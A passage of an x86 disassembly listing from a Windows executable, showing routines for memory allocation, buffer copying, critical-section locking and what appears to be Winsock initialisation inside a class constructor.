  40163a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401641:	83 c4 10             	add    $0x10,%esp
  401644:	c3                   	ret
  401645:	a0 24 e7 40 00       	mov    0x40e724,%al
  40164a:	84 c0                	test   %al,%al
  40164c:	74 12                	je     0x401660
  40164e:	32 c0                	xor    %al,%al
  401650:	5e                   	pop    %esi
  401651:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401655:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40165c:	83 c4 10             	add    $0x10,%esp
  40165f:	c3                   	ret
  401660:	6a 5c                	push   $0x5c
  401662:	e8 79 90 00 00       	call   0x40a6e0
  401667:	83 c4 04             	add    $0x4,%esp
  40166a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40166e:	85 c0                	test   %eax,%eax
  401670:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401677:	00 
  401678:	74 09                	je     0x401683
  40167a:	8b c8                	mov    %eax,%ecx
  40167c:	e8 7f f9 ff ff       	call   0x401000
  401681:	eb 02                	jmp    0x401685
  401683:	33 c0                	xor    %eax,%eax
  401685:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401689:	89 46 10             	mov    %eax,0x10(%esi)
  40168c:	b0 01                	mov    $0x1,%al
  40168e:	5e                   	pop    %esi
  40168f:	a2 24 e7 40 00       	mov    %al,0x40e724
  401694:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40169b:	83 c4 10             	add    $0x10,%esp
  40169e:	c3                   	ret
  40169f:	90                   	nop
  4016a0:	83 ec 08             	sub    $0x8,%esp
  4016a3:	55                   	push   %ebp
  4016a4:	56                   	push   %esi
  4016a5:	8b e9                	mov    %ecx,%ebp
  4016a7:	57                   	push   %edi
  4016a8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4016ac:	33 ff                	xor    %edi,%edi
  4016ae:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4016b1:	50                   	push   %eax
  4016b2:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4016b6:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4016ba:	e8 21 fb ff ff       	call   0x4011e0
  4016bf:	8b f0                	mov    %eax,%esi
  4016c1:	3b f7                	cmp    %edi,%esi
  4016c3:	75 09                	jne    0x4016ce
  4016c5:	5f                   	pop    %edi
  4016c6:	5e                   	pop    %esi
  4016c7:	33 c0                	xor    %eax,%eax
  4016c9:	5d                   	pop    %ebp
  4016ca:	83 c4 08             	add    $0x8,%esp
  4016cd:	c3                   	ret
  4016ce:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4016d2:	53                   	push   %ebx
  4016d3:	41                   	inc    %ecx
  4016d4:	51                   	push   %ecx
  4016d5:	e8 06 90 00 00       	call   0x40a6e0
  4016da:	8b d8                	mov    %eax,%ebx
  4016dc:	83 c4 04             	add    $0x4,%esp
  4016df:	c6 03 7a             	movb   $0x7a,(%ebx)
  4016e2:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4016e6:	8b d1                	mov    %ecx,%edx
  4016e8:	8d 7b 01             	lea    0x1(%ebx),%edi
  4016eb:	c1 e9 02             	shr    $0x2,%ecx
  4016ee:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4016f0:	8b ca                	mov    %edx,%ecx
  4016f2:	83 e1 03             	and    $0x3,%ecx
  4016f5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4016f7:	8b 44 24 10          	mov    0x10(%esp),%eax
  4016fb:	85 c0                	test   %eax,%eax
  4016fd:	76 1f                	jbe    0x40171e
  4016ff:	40                   	inc    %eax
  401700:	8b cd                	mov    %ebp,%ecx
  401702:	50                   	push   %eax
  401703:	53                   	push   %ebx
  401704:	e8 97 48 00 00       	call   0x405fa0
  401709:	53                   	push   %ebx
  40170a:	8b f0                	mov    %eax,%esi
  40170c:	e8 d5 8f 00 00       	call   0x40a6e6
  401711:	83 c4 04             	add    $0x4,%esp
  401714:	8b c6                	mov    %esi,%eax
  401716:	5b                   	pop    %ebx
  401717:	5f                   	pop    %edi
  401718:	5e                   	pop    %esi
  401719:	5d                   	pop    %ebp
  40171a:	83 c4 08             	add    $0x8,%esp
  40171d:	c3                   	ret
  40171e:	8b 74 24 14          	mov    0x14(%esp),%esi
  401722:	53                   	push   %ebx
  401723:	e8 be 8f 00 00       	call   0x40a6e6
  401728:	83 c4 04             	add    $0x4,%esp
  40172b:	8b c6                	mov    %esi,%eax
  40172d:	5b                   	pop    %ebx
  40172e:	5f                   	pop    %edi
  40172f:	5e                   	pop    %esi
  401730:	5d                   	pop    %ebp
  401731:	83 c4 08             	add    $0x8,%esp
  401734:	c3                   	ret
  401735:	90                   	nop
  401736:	90                   	nop
  401737:	90                   	nop
  401738:	90                   	nop
  401739:	90                   	nop
  40173a:	90                   	nop
  40173b:	90                   	nop
  40173c:	90                   	nop
  40173d:	90                   	nop
  40173e:	90                   	nop
  40173f:	90                   	nop
  401740:	8b 44 24 08          	mov    0x8(%esp),%eax
  401744:	8b 54 24 04          	mov    0x4(%esp),%edx
  401748:	83 f8 01             	cmp    $0x1,%eax
  40174b:	75 11                	jne    0x40175e
  40174d:	53                   	push   %ebx
  40174e:	8a 1a                	mov    (%edx),%bl
  401750:	80 fb 1e             	cmp    $0x1e,%bl
  401753:	5b                   	pop    %ebx
  401754:	75 08                	jne    0x40175e
  401756:	e8 d5 48 00 00       	call   0x406030
  40175b:	c2 08 00             	ret    $0x8
  40175e:	8b 49 10             	mov    0x10(%ecx),%ecx
  401761:	50                   	push   %eax
  401762:	52                   	push   %edx
  401763:	e8 d8 fa ff ff       	call   0x401240
  401768:	c2 08 00             	ret    $0x8
  40176b:	90                   	nop
  40176c:	90                   	nop
  40176d:	90                   	nop
  40176e:	90                   	nop
  40176f:	90                   	nop
  401770:	a0 24 e7 40 00       	mov    0x40e724,%al
  401775:	84 c0                	test   %al,%al
  401777:	74 1c                	je     0x401795
  401779:	56                   	push   %esi
  40177a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40177e:	8b ce                	mov    %esi,%ecx
  401780:	e8 1b ff ff ff       	call   0x4016a0
  401785:	a0 24 e7 40 00       	mov    0x40e724,%al
  40178a:	84 c0                	test   %al,%al
  40178c:	75 f0                	jne    0x40177e
  40178e:	83 c8 ff             	or     $0xffffffff,%eax
  401791:	5e                   	pop    %esi
  401792:	c2 04 00             	ret    $0x4
  401795:	83 c8 ff             	or     $0xffffffff,%eax
  401798:	c2 04 00             	ret    $0x4
  40179b:	90                   	nop
  40179c:	90                   	nop
  40179d:	90                   	nop
  40179e:	90                   	nop
  40179f:	90                   	nop
  4017a0:	56                   	push   %esi
  4017a1:	8b f1                	mov    %ecx,%esi
  4017a3:	33 c0                	xor    %eax,%eax
  4017a5:	89 46 0c             	mov    %eax,0xc(%esi)
  4017a8:	89 46 04             	mov    %eax,0x4(%esi)
  4017ab:	89 46 08             	mov    %eax,0x8(%esi)
  4017ae:	8d 46 10             	lea    0x10(%esi),%eax
  4017b1:	50                   	push   %eax
  4017b2:	c7 06 54 b4 40 00    	movl   $0x40b454,(%esi)
  4017b8:	ff 15 f8 b1 40 00    	call   *0x40b1f8
  4017be:	8b c6                	mov    %esi,%eax
  4017c0:	5e                   	pop    %esi
  4017c1:	c3                   	ret
  4017c2:	90                   	nop
  4017c3:	90                   	nop
  4017c4:	90                   	nop
  4017c5:	90                   	nop
  4017c6:	90                   	nop
  4017c7:	90                   	nop
  4017c8:	90                   	nop
  4017c9:	90                   	nop
  4017ca:	90                   	nop
  4017cb:	90                   	nop
  4017cc:	90                   	nop
  4017cd:	90                   	nop
  4017ce:	90                   	nop
  4017cf:	90                   	nop
  4017d0:	56                   	push   %esi
  4017d1:	8b f1                	mov    %ecx,%esi
  4017d3:	e8 18 00 00 00       	call   0x4017f0
  4017d8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4017dd:	74 09                	je     0x4017e8
  4017df:	56                   	push   %esi
  4017e0:	e8 01 8f 00 00       	call   0x40a6e6
  4017e5:	83 c4 04             	add    $0x4,%esp
  4017e8:	8b c6                	mov    %esi,%eax
  4017ea:	5e                   	pop    %esi
  4017eb:	c2 04 00             	ret    $0x4
  4017ee:	90                   	nop
  4017ef:	90                   	nop
  4017f0:	56                   	push   %esi
  4017f1:	8b f1                	mov    %ecx,%esi
  4017f3:	8b 46 04             	mov    0x4(%esi),%eax
  4017f6:	c7 06 54 b4 40 00    	movl   $0x40b454,(%esi)
  4017fc:	85 c0                	test   %eax,%eax
  4017fe:	74 0e                	je     0x40180e
  401800:	68 00 80 00 00       	push   $0x8000
  401805:	6a 00                	push   $0x0
  401807:	50                   	push   %eax
  401808:	ff 15 ec b1 40 00    	call   *0x40b1ec
  40180e:	83 c6 10             	add    $0x10,%esi
  401811:	56                   	push   %esi
  401812:	ff 15 f0 b1 40 00    	call   *0x40b1f0
  401818:	5e                   	pop    %esi
  401819:	c3                   	ret
  40181a:	90                   	nop
  40181b:	90                   	nop
  40181c:	90                   	nop
  40181d:	90                   	nop
  40181e:	90                   	nop
  40181f:	90                   	nop
  401820:	51                   	push   %ecx
  401821:	53                   	push   %ebx
  401822:	8b d9                	mov    %ecx,%ebx
  401824:	55                   	push   %ebp
  401825:	56                   	push   %esi
  401826:	8d 73 10             	lea    0x10(%ebx),%esi
  401829:	56                   	push   %esi
  40182a:	89 74 24 10          	mov    %esi,0x10(%esp)
  40182e:	ff 15 b0 b0 40 00    	call   *0x40b0b0
  401834:	8b cb                	mov    %ebx,%ecx
  401836:	e8 25 01 00 00       	call   0x401960
  40183b:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  40183f:	8b cb                	mov    %ebx,%ecx
  401841:	03 c5                	add    %ebp,%eax
  401843:	50                   	push   %eax
  401844:	e8 27 01 00 00       	call   0x401970
  401849:	83 f8 ff             	cmp    $0xffffffff,%eax
  40184c:	75 10                	jne    0x40185e
  40184e:	56                   	push   %esi
  40184f:	ff 15 58 b1 40 00    	call   *0x40b158
  401855:	5e                   	pop    %esi
  401856:	5d                   	pop    %ebp
  401857:	33 c0                	xor    %eax,%eax
  401859:	5b                   	pop    %ebx
  40185a:	59                   	pop    %ecx
  40185b:	c2 08 00             	ret    $0x8
  40185e:	8b 74 24 14          	mov    0x14(%esp),%esi
  401862:	8b cd                	mov    %ebp,%ecx
  401864:	8b c1                	mov    %ecx,%eax
  401866:	57                   	push   %edi
  401867:	8b 7b 08             	mov    0x8(%ebx),%edi
  40186a:	c1 e9 02             	shr    $0x2,%ecx
  40186d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40186f:	8b c8                	mov    %eax,%ecx
  401871:	83 e1 03             	and    $0x3,%ecx
  401874:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401876:	8b 4b 08             	mov    0x8(%ebx),%ecx
  401879:	03 cd                	add    %ebp,%ecx
  40187b:	89 4b 08             	mov    %ecx,0x8(%ebx)
  40187e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401882:	51                   	push   %ecx
  401883:	ff 15 58 b1 40 00    	call   *0x40b158
  401889:	5f                   	pop    %edi
  40188a:	8b c5                	mov    %ebp,%eax
  40188c:	5e                   	pop    %esi
  40188d:	5d                   	pop    %ebp
  40188e:	5b                   	pop    %ebx
  40188f:	59                   	pop    %ecx
  401890:	c2 08 00             	ret    $0x8
  401893:	90                   	nop
  401894:	90                   	nop
  401895:	90                   	nop
  401896:	90                   	nop
  401897:	90                   	nop
  401898:	90                   	nop
  401899:	90                   	nop
  40189a:	90                   	nop
  40189b:	90                   	nop
  40189c:	90                   	nop
  40189d:	90                   	nop
  40189e:	90                   	nop
  40189f:	90                   	nop
  4018a0:	51                   	push   %ecx
  4018a1:	53                   	push   %ebx
  4018a2:	8b d9                	mov    %ecx,%ebx
  4018a4:	55                   	push   %ebp
  4018a5:	56                   	push   %esi
  4018a6:	8d 73 10             	lea    0x10(%ebx),%esi
  4018a9:	56                   	push   %esi
  4018aa:	89 74 24 10          	mov    %esi,0x10(%esp)
  4018ae:	ff 15 b0 b0 40 00    	call   *0x40b0b0
  4018b4:	8b cb                	mov    %ebx,%ecx
  4018b6:	e8 95 00 00 00       	call   0x401950
  4018bb:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4018bf:	3b e8                	cmp    %eax,%ebp
  4018c1:	76 10                	jbe    0x4018d3
  4018c3:	56                   	push   %esi
  4018c4:	ff 15 58 b1 40 00    	call   *0x40b158
  4018ca:	5e                   	pop    %esi
  4018cb:	5d                   	pop    %ebp
  4018cc:	33 c0                	xor    %eax,%eax
  4018ce:	5b                   	pop    %ebx
  4018cf:	59                   	pop    %ecx
  4018d0:	c2 08 00             	ret    $0x8
  4018d3:	8b cb                	mov    %ebx,%ecx
  4018d5:	e8 86 00 00 00       	call   0x401960
  4018da:	3b e8                	cmp    %eax,%ebp
  4018dc:	76 09                	jbe    0x4018e7
  4018de:	8b cb                	mov    %ebx,%ecx
  4018e0:	e8 7b 00 00 00       	call   0x401960
  4018e5:	8b e8                	mov    %eax,%ebp
  4018e7:	85 ed                	test   %ebp,%ebp
  4018e9:	74 40                	je     0x40192b
  4018eb:	8b 73 04             	mov    0x4(%ebx),%esi
  4018ee:	8b cd                	mov    %ebp,%ecx
  4018f0:	8b c1                	mov    %ecx,%eax
  4018f2:	57                   	push   %edi
  4018f3:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4018f7:	c1 e9 02             	shr    $0x2,%ecx
  4018fa:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4018fc:	8b c8                	mov    %eax,%ecx
  4018fe:	83 e1 03             	and    $0x3,%ecx
  401901:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401903:	8b 73 04             	mov    0x4(%ebx),%esi
  401906:	8b cb                	mov    %ebx,%ecx
  401908:	e8 43 00 00 00       	call   0x401950
  40190d:	2b c5                	sub    %ebp,%eax
  40190f:	8d 0c 2e             	lea    (%esi,%ebp,1),%ecx
  401912:	50                   	push   %eax
  401913:	51                   	push   %ecx
  401914:	56                   	push   %esi
  401915:	ff 15 44 b2 40 00    	call   *0x40b244
  40191b:	8b 43 08             	mov    0x8(%ebx),%eax
  40191e:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401922:	83 c4 0c             	add    $0xc,%esp
  401925:	2b c5                	sub    %ebp,%eax
  401927:	89 43 08             	mov    %eax,0x8(%ebx)
  40192a:	5f                   	pop    %edi
  40192b:	8b cb                	mov    %ebx,%ecx
  40192d:	e8 2e 00 00 00       	call   0x401960
  401932:	50                   	push   %eax
  401933:	8b cb                	mov    %ebx,%ecx
  401935:	e8 06 01 00 00       	call   0x401a40
  40193a:	56                   	push   %esi
  40193b:	ff 15 58 b1 40 00    	call   *0x40b158
  401941:	8b c5                	mov    %ebp,%eax
  401943:	5e                   	pop    %esi
  401944:	5d                   	pop    %ebp
  401945:	5b                   	pop    %ebx
  401946:	59                   	pop    %ecx
  401947:	c2 08 00             	ret    $0x8
  40194a:	90                   	nop
  40194b:	90                   	nop
  40194c:	90                   	nop
  40194d:	90                   	nop
  40194e:	90                   	nop
  40194f:	90                   	nop
  401950:	8b 41 0c             	mov    0xc(%ecx),%eax
  401953:	c3                   	ret
  401954:	90                   	nop
  401955:	90                   	nop
  401956:	90                   	nop
  401957:	90                   	nop
  401958:	90                   	nop
  401959:	90                   	nop
  40195a:	90                   	nop
  40195b:	90                   	nop
  40195c:	90                   	nop
  40195d:	90                   	nop
  40195e:	90                   	nop
  40195f:	90                   	nop
  401960:	8b 51 04             	mov    0x4(%ecx),%edx
  401963:	85 d2                	test   %edx,%edx
  401965:	75 03                	jne    0x40196a
  401967:	33 c0                	xor    %eax,%eax
  401969:	c3                   	ret
  40196a:	8b 41 08             	mov    0x8(%ecx),%eax
  40196d:	2b c2                	sub    %edx,%eax
  40196f:	c3                   	ret
  401970:	83 ec 08             	sub    $0x8,%esp
  401973:	53                   	push   %ebx
  401974:	55                   	push   %ebp
  401975:	57                   	push   %edi
  401976:	8b d9                	mov    %ecx,%ebx
  401978:	e8 d3 ff ff ff       	call   0x401950
  40197d:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401981:	3b c8                	cmp    %eax,%ecx
  401983:	73 0b                	jae    0x401990
  401985:	5f                   	pop    %edi
  401986:	5d                   	pop    %ebp
  401987:	33 c0                	xor    %eax,%eax
  401989:	5b                   	pop    %ebx
  40198a:	83 c4 08             	add    $0x8,%esp
  40198d:	c2 04 00             	ret    $0x4
  401990:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  401994:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40199b:	00 
  40199c:	df 6c 24 0c          	fildll 0xc(%esp)
  4019a0:	83 ec 08             	sub    $0x8,%esp
  4019a3:	dc 0d 58 b4 40 00    	fmull  0x40b458
  4019a9:	dd 1c 24             	fstpl  (%esp)
  4019ac:	ff 15 48 b2 40 00    	call   *0x40b248
  4019b2:	83 c4 08             	add    $0x8,%esp
  4019b5:	e8 46 8d 00 00       	call   0x40a700
  4019ba:	8b e8                	mov    %eax,%ebp
  4019bc:	6a 04                	push   $0x4
  4019be:	c1 e5 0a             	shl    $0xa,%ebp
  4019c1:	68 00 10 00 00       	push   $0x1000
  4019c6:	55                   	push   %ebp
  4019c7:	6a 00                	push   $0x0
  4019c9:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  4019cf:	8b f8                	mov    %eax,%edi
  4019d1:	85 ff                	test   %edi,%edi
  4019d3:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4019d7:	75 0c                	jne    0x4019e5
  4019d9:	5f                   	pop    %edi
  4019da:	5d                   	pop    %ebp
  4019db:	83 c8 ff             	or     $0xffffffff,%eax
  4019de:	5b                   	pop    %ebx
  4019df:	83 c4 08             	add    $0x8,%esp
  4019e2:	c2 04 00             	ret    $0x4
  4019e5:	56                   	push   %esi
  4019e6:	8b cb                	mov    %ebx,%ecx
  4019e8:	e8 73 ff ff ff       	call   0x401960
  4019ed:	8b 73 04             	mov    0x4(%ebx),%esi
  4019f0:	8b c8                	mov    %eax,%ecx
  4019f2:	8b d1                	mov    %ecx,%edx
  4019f4:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4019f8:	c1 e9 02             	shr    $0x2,%ecx
  4019fb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4019fd:	8b ca                	mov    %edx,%ecx
  4019ff:	83 e1 03             	and    $0x3,%ecx
  401a02:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401a04:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401a07:	5e                   	pop    %esi
  401a08:	85 c9                	test   %ecx,%ecx
  401a0a:	74 12                	je     0x401a1e
  401a0c:	68 00 80 00 00       	push   $0x8000
  401a11:	6a 00                	push   $0x0
  401a13:	51                   	push   %ecx
  401a14:	ff 15 ec b1 40 00    	call   *0x40b1ec
  401a1a:	8b 44 24 18          	mov    0x18(%esp),%eax
  401a1e:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401a22:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  401a25:	03 c1                	add    %ecx,%eax
  401a27:	5f                   	pop    %edi
  401a28:	89 43 08             	mov    %eax,0x8(%ebx)
  401a2b:	8b c5                	mov    %ebp,%eax
  401a2d:	89 4b 04             	mov    %ecx,0x4(%ebx)
  401a30:	5d                   	pop    %ebp
  401a31:	5b                   	pop    %ebx
  401a32:	83 c4 08             	add    $0x8,%esp
  401a35:	c2 04 00             	ret    $0x4
  401a38:	90                   	nop
  401a39:	90                   	nop
  401a3a:	90                   	nop
  401a3b:	90                   	nop
  401a3c:	90                   	nop
  401a3d:	90                   	nop
  401a3e:	90                   	nop
  401a3f:	90                   	nop
  401a40:	83 ec 08             	sub    $0x8,%esp
  401a43:	53                   	push   %ebx
  401a44:	55                   	push   %ebp
  401a45:	8b d9                	mov    %ecx,%ebx
  401a47:	e8 14 ff ff ff       	call   0x401960
  401a4c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401a50:	3b c8                	cmp    %eax,%ecx
  401a52:	73 0a                	jae    0x401a5e
  401a54:	5d                   	pop    %ebp
  401a55:	33 c0                	xor    %eax,%eax
  401a57:	5b                   	pop    %ebx
  401a58:	83 c4 08             	add    $0x8,%esp
  401a5b:	c2 04 00             	ret    $0x4
  401a5e:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401a62:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  401a69:	00 
  401a6a:	df 6c 24 08          	fildll 0x8(%esp)
  401a6e:	83 ec 08             	sub    $0x8,%esp
  401a71:	dc 0d 58 b4 40 00    	fmull  0x40b458
  401a77:	dd 1c 24             	fstpl  (%esp)
  401a7a:	ff 15 48 b2 40 00    	call   *0x40b248
  401a80:	83 c4 08             	add    $0x8,%esp
  401a83:	e8 78 8c 00 00       	call   0x40a700
  401a88:	8b e8                	mov    %eax,%ebp
  401a8a:	8b cb                	mov    %ebx,%ecx
  401a8c:	c1 e5 0a             	shl    $0xa,%ebp
  401a8f:	e8 bc fe ff ff       	call   0x401950
  401a94:	3b e8                	cmp    %eax,%ebp
  401a96:	73 0a                	jae    0x401aa2
  401a98:	5d                   	pop    %ebp
  401a99:	33 c0                	xor    %eax,%eax
  401a9b:	5b                   	pop    %ebx
  401a9c:	83 c4 08             	add    $0x8,%esp
  401a9f:	c2 04 00             	ret    $0x4
  401aa2:	56                   	push   %esi
  401aa3:	57                   	push   %edi
  401aa4:	6a 04                	push   $0x4
  401aa6:	68 00 10 00 00       	push   $0x1000
  401aab:	55                   	push   %ebp
  401aac:	6a 00                	push   $0x0
  401aae:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  401ab4:	8b f8                	mov    %eax,%edi
  401ab6:	8b cb                	mov    %ebx,%ecx
  401ab8:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  401abc:	e8 9f fe ff ff       	call   0x401960
  401ac1:	8b 73 04             	mov    0x4(%ebx),%esi
  401ac4:	8b c8                	mov    %eax,%ecx
  401ac6:	c1 e9 02             	shr    $0x2,%ecx
  401ac9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401acb:	8b c8                	mov    %eax,%ecx
  401acd:	68 00 80 00 00       	push   $0x8000
  401ad2:	83 e1 03             	and    $0x3,%ecx
  401ad5:	6a 00                	push   $0x0
  401ad7:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401ad9:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401adc:	89 44 24 18          	mov    %eax,0x18(%esp)
  401ae0:	51                   	push   %ecx
  401ae1:	ff 15 ec b1 40 00    	call   *0x40b1ec
  401ae7:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401aeb:	8b 54 24 10          	mov    0x10(%esp),%edx
  401aef:	89 43 04             	mov    %eax,0x4(%ebx)
  401af2:	03 d0                	add    %eax,%edx
  401af4:	5f                   	pop    %edi
  401af5:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  401af8:	8b c5                	mov    %ebp,%eax
  401afa:	5e                   	pop    %esi
  401afb:	89 53 08             	mov    %edx,0x8(%ebx)
  401afe:	5d                   	pop    %ebp
  401aff:	5b                   	pop    %ebx
  401b00:	83 c4 08             	add    $0x8,%esp
  401b03:	c2 04 00             	ret    $0x4
  401b06:	90                   	nop
  401b07:	90                   	nop
  401b08:	90                   	nop
  401b09:	90                   	nop
  401b0a:	90                   	nop
  401b0b:	90                   	nop
  401b0c:	90                   	nop
  401b0d:	90                   	nop
  401b0e:	90                   	nop
  401b0f:	90                   	nop
  401b10:	56                   	push   %esi
  401b11:	8b f1                	mov    %ecx,%esi
  401b13:	57                   	push   %edi
  401b14:	8d 7e 10             	lea    0x10(%esi),%edi
  401b17:	57                   	push   %edi
  401b18:	ff 15 b0 b0 40 00    	call   *0x40b0b0
  401b1e:	8b 46 04             	mov    0x4(%esi),%eax
  401b21:	68 00 04 00 00       	push   $0x400
  401b26:	8b ce                	mov    %esi,%ecx
  401b28:	89 46 08             	mov    %eax,0x8(%esi)
  401b2b:	e8 10 ff ff ff       	call   0x401a40
  401b30:	57                   	push   %edi
  401b31:	ff 15 58 b1 40 00    	call   *0x40b158
  401b37:	5f                   	pop    %edi
  401b38:	5e                   	pop    %esi
  401b39:	c3                   	ret
  401b3a:	90                   	nop
  401b3b:	90                   	nop
  401b3c:	90                   	nop
  401b3d:	90                   	nop
  401b3e:	90                   	nop
  401b3f:	90                   	nop
  401b40:	8b 41 04             	mov    0x4(%ecx),%eax
  401b43:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401b47:	03 c1                	add    %ecx,%eax
  401b49:	c2 04 00             	ret    $0x4
  401b4c:	90                   	nop
  401b4d:	90                   	nop
  401b4e:	90                   	nop
  401b4f:	90                   	nop
  401b50:	6a ff                	push   $0xffffffff
  401b52:	68 2a aa 40 00       	push   $0x40aa2a
  401b57:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401b5d:	50                   	push   %eax
  401b5e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401b65:	81 ec 94 01 00 00    	sub    $0x194,%esp
  401b6b:	56                   	push   %esi
  401b6c:	8b f1                	mov    %ecx,%esi
  401b6e:	89 74 24 04          	mov    %esi,0x4(%esp)
  401b72:	8d 4e 04             	lea    0x4(%esi),%ecx
  401b75:	e8 26 fc ff ff       	call   0x4017a0
  401b7a:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  401b7d:	c7 84 24 a0 01 00 00 	movl   $0x0,0x1a0(%esp)
  401b84:	00 00 00 00 
  401b88:	e8 13 fc ff ff       	call   0x4017a0
  401b8d:	8d 4e 54             	lea    0x54(%esi),%ecx
  401b90:	c6 84 24 a0 01 00 00 	movb   $0x1,0x1a0(%esp)
  401b97:	01 
  401b98:	e8 03 fc ff ff       	call   0x4017a0
  401b9d:	8d 4e 7c             	lea    0x7c(%esi),%ecx
  401ba0:	c6 84 24 a0 01 00 00 	movb   $0x2,0x1a0(%esp)
  401ba7:	02 
  401ba8:	e8 f3 fb ff ff       	call   0x4017a0
  401bad:	8d 44 24 08          	lea    0x8(%esp),%eax
  401bb1:	c7 06 60 b4 40 00    	movl   $0x40b460,(%esi)
  401bb7:	50                   	push   %eax
  401bb8:	68 02 02 00 00       	push   $0x202
  401bbd:	ff 15 30 b4 40 00    	call   *0x40b430
  401bc3:	6a 00                	push   $0x0
  401bc5:	6a 00                	push   $0x0
  401bc7:	6a 01                	push   $0x1
  401bc9:	6a 00                	push   $0x0
  401bcb:	ff 15 e8 b1 40 00    	call   *0x40b1e8
  401bd1:	c6 44 24 04 68       	movb   $0x68,0x4(%esp)
  401bd6:	c6 44 24 05 78       	movb   $0x78,0x5(%esp)
  401bdb:	66 8b 54 24 04       	mov    0x4(%esp),%dx
  401be0:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  401be6:	89 86 ac 00 00 00    	mov    %eax,0xac(%esi)
  401bec:	b0 20                	mov    $0x20,%al
  401bee:	66 89 11             	mov    %dx,(%ecx)
  401bf1:	c6 86 b3 00 00 00 00 	movb   $0x0,0xb3(%esi)
  401bf8:	c7 86 a8 00 00 00 ff 	movl   $0xffffffff,0xa8(%esi)
  401bff:	ff ff ff 
  401c02:	88 41 02             	mov    %al,0x2(%ecx)
  401c05:	8b 8c 24 98 01 00 00 	mov    0x198(%esp),%ecx
  401c0c:	8b c6                	mov    %esi,%eax
  401c0e:	5e                   	pop    %esi
  401c0f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401c16:	81 c4 a0 01 00 00    	add    $0x1a0,%esp
  401c1c:	c3                   	ret
  401c1d:	90                   	nop
  401c1e:	90                   	nop
  401c1f:	90                   	nop
  401c20:	56                   	push   %esi
  401c21:	8b f1                	mov    %ecx,%esi
  401c23:	e8 18 00 00 00       	call   0x401c40
  401c28:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401c2d:	74 09                	je     0x401c38
  401c2f:	56                   	push   %esi
  401c30:	e8 b1 8a 00 00       	call   0x40a6e6
  401c35:	83 c4 04             	add    $0x4,%esp
  401c38:	8b c6                	mov    %esi,%eax
  401c3a:	5e                   	pop    %esi
  401c3b:	c2 04 00             	ret    $0x4
  401c3e:	90                   	nop
  401c3f:	90                   	nop
  401c40:	6a ff                	push   $0xffffffff
  401c42:	68 6c aa 40 00       	push   $0x40aa6c
  401c47:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401c4d:	50                   	push   %eax
  401c4e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401c55:	51                   	push   %ecx
  401c56:	56                   	push   %esi
  401c57:	8b f1                	mov    %ecx,%esi
  401c59:	57                   	push   %edi
  401c5a:	89 74 24 08          	mov    %esi,0x8(%esp)
  401c5e:	c7 06 60 b4 40 00    	movl   $0x40b460,(%esi)
  401c64:	8b 86 a4 00 00 00    	mov    0xa4(%esi),%eax
  401c6a:	6a ff                	push   $0xffffffff
  401c6c:	50                   	push   %eax
  401c6d:	c7 44 24 1c 03 00 00 	movl   $0x3,0x1c(%esp)
  401c74:	00 
  401c75:	c6 86 b3 00 00 00 00 	movb   $0x0,0xb3(%esi)
  401c7c:	ff 15 dc b1 40 00    	call   *0x40b1dc
  401c82:	83 be a8 00 00 00 ff 	cmpl   $0xffffffff,0xa8(%esi)
  401c89:	74 07                	je     0x401c92
  401c8b:	8b ce                	mov    %esi,%ecx
  401c8d:	e8 de 04 00 00       	call   0x402170
  401c92:	8b 8e a4 00 00 00    	mov    0xa4(%esi),%ecx
  401c98:	8b 3d e4 b1 40 00    	mov    0x40b1e4,%edi
  401c9e:	51                   	push   %ecx
